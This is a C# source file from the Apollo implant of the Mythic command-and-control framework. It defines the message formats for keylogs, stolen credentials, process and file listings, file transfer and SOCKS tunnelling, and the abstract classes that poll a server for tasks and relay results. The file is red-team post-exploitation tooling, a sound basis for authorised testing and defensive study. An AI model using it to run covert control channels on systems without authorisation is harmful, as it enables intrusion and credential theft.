using System.Diagnostics;
using Apollo.CommandModules;
using System.Collections.Generic;
using System.Threading;
using System.IO;
using System;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Apollo.MessageInbox;
using System.Security;
using Apollo.Tasks;
//using System.Threading.Tasks;

namespace Mythic
{
    namespace Structs
    {

        public struct EdgeNode
        {
            public string source; // uuid of callback
            public string destination; // uuid of adjoining callback
            public int direction; // 1, 2, or 3
            public string metadata; // json string (optional)
            public string action;
            public string c2_profile;
        }

        // https://docs.apfell.net/v/version1.4/customizing/hooking-features/action-p2p_info
        public struct EdgeNodeMessage
        {
            public EdgeNode[] edges;
        }

        public struct EdgeNodeRegistrationMessage
        {
            public string task_id;

        }

        public struct AssemblyResponse
        {
            public string[] output;
            public int sacrificial_pid;
            public string sacrificial_process_name;
        }

        public struct MythicKeylogMessage
        {
            public string task_id;
            public string user;
            public string window_title;
            public string keystrokes;
        }

        public struct MythicCredential
        {
            //one of:
            //plaintext
            //certificate
            //hash
            //key
            //ticket
            //cookie
            public string credential_type; 
            public string realm; // the domain
            public string credential; // the password
            public string account; // the username

            public MythicCredential(bool tmp = false)
            {
                credential_type = "";
                realm = "";
                credential = "";
                account = "";
            }
        }

        public struct MythicCredentialResponse
        {
            public string task_id;
            public MythicCredential[] credentials;
        }

        public struct C2ProfileInfo
        {
            public string name;
            public bool is_p2p;
            public Dictionary<string, string> parameters;
        }

        public struct ConnectionInfo
        {
            public string host;
            public C2ProfileInfo c2_profile;
            public string agent_uuid;
        }

        public struct LinkMessage
        {
            public ConnectionInfo connection_info;
        }


        public struct RemovedFileInformation
        {
            public string host;
            public string path;
        }

        public struct Artifact
        {
            public string base_artifact;
            public string artifact;

            public Artifact(string baseArtifact, string artifactMsg)
            {
                base_artifact = baseArtifact;
                artifact = artifactMsg;
            }
        }

        /// <summary>
        /// When the Apfell server receives feedback from the "ps" task,
        /// each entry in the list should be populated with these attributes
        /// (assuming the enumerator has proper permissions to retrieve said data)
        /// </summary>
        public struct ProcessEntry
        {
            public int process_id;
            public string process_name;
            public int parent_process_id;
            public string user;
            public string arch;
            public string integrity_level;
            public string description;
            public string company_name;
            public int session;
            public string command_line;
            public string file_path;
            public string window_title;
        }

        public struct FileBrowserResponse
        {
            public string host;
            public bool is_file;
            public Dictionary<string, string>[] permissions;
            public string name;
            public string parent_path;
            public bool success;
            public string access_time;
            public string modify_time;
            public long size;
            public FileInformation[] files;
        }

        /// <summary>
        /// When the Apfell server receives data from the "ls" task,
        /// each file and folder in the directory should be populated
        /// with this data.
        /// </summary>
        public struct FileInformation
        {
            
            public string full_name;
            public string name;
            public string directory;
            public string creation_date;
            public string modify_time;
            public string access_time;
            public Dictionary<string, string>[] permissions; // maybe should be int?
            public string extended_attributes; // maybe should be int?
            public long size;
            public string owner;
            public string group;
            public bool hidden;
            public bool is_file;
        }

        /// <summary>
        /// Not sure where this is. I think this is lost in the Download
        /// revamp that hasn't been started on yet.
        /// </summary>
        internal struct MythicTaskResponse
        {
            public string status;
            public string task_id;
            public string file_id;
            public string error;
            public string message_id;

            public override string ToString()
            {
                return String.Format("{'status': {0}, 'task_id': {1}, 'file_id': {2}, 'error': {3}, 'message_id': {4}}", status, task_id, file_id, error, message_id);
            }
        }

        /// <summary>
        /// When attempting to upload a file to target (aka, the machine the agent
        /// is running on), the client (us) needs to determine what file to pull down,
        /// the chunk size, and how many chunks it'll take to pull down. This message
        /// wraps that information.
        /// 
        /// See: https://docs.apfell.net/v/version1.4/c2-profile-development/c2-profile-code/agent-side-coding/action-upload
        /// </summary>
        public struct UploadFileRegistrationMessage
        {
            public string action;
            public int chunk_size;
            public string file_id;
            public int chunk_num;
            public string full_path;
            public string task_id;
            public string message_id;
        }

        /// <summary>
        /// Sequential message to get the next chunk of the file to plant onto target.
        /// chunk_data is base64 encoded file bytes.
        /// 
        /// See: https://docs.apfell.net/v/version1.4/c2-profile-development/c2-profile-code/agent-side-coding/untitled-1
        /// </summary>
        internal struct UploadReply
        {
            public string action;
            public int total_chunks;
            public int chunk_num;
            public string chunk_data;
            public string message_id;
        }


        /// <summary>
        /// When the agent checks in for taskings, the server replies with a list
        /// of tasks for the agent to execute. These taskings are wrapped up in the
        /// ApfellResponse structure.
        /// </summary>
        internal struct MythicServerResponse
        {
            public string action;
            public MythicTaskResponse[] responses;
            public Dictionary<string, string>[] delegates;
            public string message_id;
        }

        /// <summary>
        /// When a task finishes executing, it needs a generic wrapper
        /// for serialization of responses. This is that wrapper.
        /// </summary>
        internal struct TaskResponse
        {
            public string action;
            //public string id;
            public Apollo.Tasks.ApolloTaskResponse[] responses;
            public Dictionary<string, string>[] delegates;
            public string message_id;
            public object socks;

            public TaskResponse(string _action, Apollo.Tasks.ApolloTaskResponse[] _responses, Dictionary<string, string>[] _delegates, string _message_id, object _socks)
            {
                action = _action;
                responses = _responses;
                delegates = _delegates;
                message_id = _message_id;
                if (_socks == null)
                    socks = null;
                else if (_socks.GetType() != typeof(SocksStartInfo) && _socks.GetType() != typeof(SocksStopInfo) && _socks.GetType() != typeof(SocksDatagram[]))
                    throw new Exception($"Invalid object type of _socks: {_socks.GetType().ToString()}");
                else
                    socks = _socks;
            }
        }

        public struct SocksStartControlMessage
        {
            public string task_id;
            public SocksStartInfo socks;
        }

        public struct SocksStopControlMessage
        {
            public string task_id;
            public SocksStopInfo socks;
        }

        public struct SocksStartInfo
        {
            public int start;
        }

        public struct SocksStopInfo
        {
            public int stop;
        }


        public struct SocksDatagram
        {
            public int server_id;
            public string data;
        }

        internal struct FileBrowserParameters
        {
            public string host;
            public string path;
            public string file;
        }

        internal struct CheckTaskingRequest
        {
            public string action;
            public int tasking_size;
            public Dictionary<string, string>[] delegates;
            public string message_id;
        }

        /// <summary>
        /// Structure that is responsible for containing a task issued by the server.
        /// </summary>
        internal struct CheckTaskingResponse
        {
            public string action;
            public Apollo.Tasks.Task[] tasks;
            public Dictionary<string, string>[] delegates;
            public string message_id;
            public SocksDatagram[] socks;
            // public DelegateMessages[] delegateMessages;
        }

        /// <summary>
        /// Struct for file chunks, used when sending files to the Apfell server
        /// </summary>
        public struct FileChunk
        {
            public int chunk_num;
            public string file_id;
            public string chunk_data;
            public string task_id;
        }

        public struct DelegateMessage
        {
            public string UUID;
            public string Message;
        }

        public struct TaskQueue
        {
            public Task[] Tasks;
            public DelegateMessage[] Delegates;
            public SocksDatagram[] SocksDatagrams;
        }
    }

    namespace C2Profiles
    {
        using Apollo.CommandModules;
        using Mythic.Structs;
        /// <summary>
        /// The C2Profile class is an abstract class that enforces each implementation of a C2
        /// profile will have certain functions associated with it.
        /// </summary>
        public abstract class C2Profile
        {
            public int ChunkSize = 512000;

            public int CallbackInterval;
            public int CallbackJitter;

            public List<Dictionary<string, string>> DelegateMessageRequestQueue = new List<Dictionary<string, string>>();

            public static Dictionary<string, bool> completed = new Dictionary<string, bool>()
            {
                { "completed", true }
            };

            internal Mutex egressMtx = new Mutex();

            public Mutex DelegateMessageRequestMutex = new Mutex();

            public Crypto.Crypto cryptor;
            public abstract string SendResponse(string id, Apollo.Tasks.ApolloTaskResponse taskresp);

            public abstract string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] resps, SocksDatagram[] datagrams = null);

            public abstract bool Send(string id, string message);

            //public abstract string PostResponse(Structs.DownloadFileRegistrationMessage taskresp);

            public abstract string RegisterAgent(Apollo.Agent agent);

            public abstract Structs.TaskQueue GetMessages(Apollo.Agent agent);

            public bool SendSocksDatagrams()
            {
                //Utils.DebugUtils.DebugWriteLine("Attempting to get all messages from Queue...");
                SocksDatagram[] datagrams = Apollo.SocksProxy.SocksController.GetMythicMessagesFromQueue();
                //Utils.DebugUtils.DebugWriteLine("Got all messages from Queue!");
                bool bRet = false;
                if (datagrams.Length == 0)
                {
                    return true;
                }
                try // Try block for HTTP requests
                {
                    // Encrypt json to send to server
                    string msgId = $"{Guid.NewGuid().ToString()}";
                    Mythic.Structs.TaskResponse apfellResponse = new Mythic.Structs.TaskResponse
                    {
                        action = "post_response",
                        responses = new Apollo.Tasks.ApolloTaskResponse[] { },
                        delegates = new Dictionary<string, string>[] { },
                        socks = datagrams,
                        message_id = msgId
                    };
                    string json = JsonConvert.SerializeObject(apfellResponse);
                    if (Send(msgId, json))
                    {
                        string result = (string)Inbox.GetMessage(msgId);
                        //Utils.DebugUtils.DebugWriteLine("Got the response to sending datagrams!");
                        bRet = true;
                        //if (result.Contains("success"))
                        //    // If it was successful, return the result
                        //    bRet = true;
                    }
                    //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                    //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
                }
                catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
                {
                    bRet = false;
                }
                return bRet;
            }

            public bool SendSocksDatagram(SocksDatagram datagram)
            {
                bool bRet = false;
                try // Try block for HTTP requests
                {
                    // Encrypt json to send to server
                    string msgId = $"{datagram.server_id}-{Guid.NewGuid().ToString()}";
                    Mythic.Structs.TaskResponse apfellResponse = new Mythic.Structs.TaskResponse
                    {
                        action = "post_response",
                        responses = new Apollo.Tasks.ApolloTaskResponse[] { },
                        delegates = new Dictionary<string, string>[] { },
                        socks = new SocksDatagram[] { datagram },
                        message_id = msgId
                    };
                    string json = JsonConvert.SerializeObject(apfellResponse);
                    if (Send(msgId, json))
                    {
                        string result = (string)Inbox.GetMessage(msgId);
                        bRet = true;
                        //if (result.Contains("success"))
                        //    // If it was successful, return the result
                        //    bRet = true;
                    }
                    //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                    //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
                }
                catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
                {
                    bRet = false;
                }
                return bRet;
            }

            public abstract byte[] GetFile(string task_id, string file_id, int chunk_size);
            public abstract byte[] GetFile(Mythic.Structs.UploadFileRegistrationMessage fileReg, int chunk_size);
            //public abstract byte[] GetFile(string file_id, Apollo.Agent implant, string task_id, string full_path);
        }

        public abstract class ReverseConnectC2Profile : C2Profile
        {
            public override Structs.TaskQueue GetMessages(Apollo.Agent agent)
            {
                Structs.TaskQueue result;
                List<Task> finalTaskList = new List<Task>();
                List<Structs.DelegateMessage> finalDelegateList = new List<Structs.DelegateMessage>();
                Structs.CheckTaskingRequest req = new Structs.CheckTaskingRequest()
                {
                    action = "get_tasking",
                    tasking_size = 1
                };
                if (DelegateMessageRequestQueue.Count > 0)
                {
                    DelegateMessageRequestMutex.WaitOne();
                    req.delegates = DelegateMessageRequestQueue.ToArray();
                    DelegateMessageRequestQueue.Clear();
                    //DelegateMessageQueue = new List<Dictionary<string, string>>();
                    DelegateMessageRequestMutex.ReleaseMutex();
                }
                // Could add delegate post messages
                string json = JsonConvert.SerializeObject(req);
                string taskingId = Guid.NewGuid().ToString();
                if (Send(taskingId, json))
                {
                    string response = (string)Inbox.GetMessage(taskingId);
                    Mythic.Structs.CheckTaskingResponse resp = JsonConvert.DeserializeObject<Mythic.Structs.CheckTaskingResponse>(response);

                    foreach (Task task in resp.tasks)
                    {
                        Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
                        finalTaskList.Add(task);
                    }

                    if (resp.delegates != null)
                    {
                        foreach (Dictionary<string, string> delegateMessage in resp.delegates)
                        {
                            foreach (KeyValuePair<string, string> item in delegateMessage)
                            {
                                finalDelegateList.Add(new Structs.DelegateMessage()
                                {
                                    UUID = item.Key,
                                    Message = item.Value
                                });
                            }
                        }
                    }
                }

                result = new Structs.TaskQueue()
                {
                    Tasks = finalTaskList.ToArray(),
                    Delegates = finalDelegateList.ToArray()
                };
                //result.Add("tasks", finalTaskList.ToArray());
                //result.Add("delegates", finalDelegateList.ToArray());

                //SCTask task = JsonConvert.DeserializeObject<SCTask>(Post(json));
                return result;
            }
        }

        public abstract class BindConnectC2Profile : C2Profile
        {
            public abstract string GetTaskingMessage();
            public override Structs.TaskQueue GetMessages(Apollo.Agent agent)
            {
                Structs.TaskQueue result;
                List<Task> finalTaskList = new List<Task>();
                List<Structs.DelegateMessage> finalDelegateList = new List<Structs.DelegateMessage>();
                Structs.CheckTaskingResponse resp = JsonConvert.DeserializeObject<Structs.CheckTaskingResponse>(GetTaskingMessage());

                foreach (Task task in resp.tasks)
                {
                    Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
                    finalTaskList.Add(task);
                }

                if (resp.delegates != null)
                {
                    foreach (Dictionary<string, string> delegateMessage in resp.delegates)
                    {
                        foreach (KeyValuePair<string, string> item in delegateMessage)
                        {
                            finalDelegateList.Add(new Structs.DelegateMessage()
                            {
                                UUID = item.Key,
                                Message = item.Value
                            });
                        }
                    }
                }

                result = new Structs.TaskQueue()
                {
                    Tasks = finalTaskList.ToArray(),
                    Delegates = finalDelegateList.ToArray()
                };
                //result.Add("tasks", finalTaskList.ToArray());
                //result.Add("delegates", finalDelegateList.ToArray());

                //SCTask task = JsonConvert.DeserializeObject<SCTask>(Post(json));
                return result;
            }
        }
    }

    namespace Crypto
    {
        /// <summary>
        /// Cryptography must be implemented on each profile to encrypt the data in transit to the
        /// server on top of whatever transport mechanism you use (such as TLS). A simple class
        /// will implement only the Encrypt and Decrypt functions.
        /// </summary>
        abstract public class Crypto
        {
            internal byte[] uuid;


            internal string GetUUIDString()
            {
                return System.Text.ASCIIEncoding.ASCII.GetString(uuid);
            }

            internal byte[] GetUUIDBytes()
            {
                return uuid;
            }

            internal abstract void UpdateUUID(string oldUID);
            internal abstract string Encrypt(string plaintext);

            internal abstract string Decrypt(string encrypted);
        }
    }
}
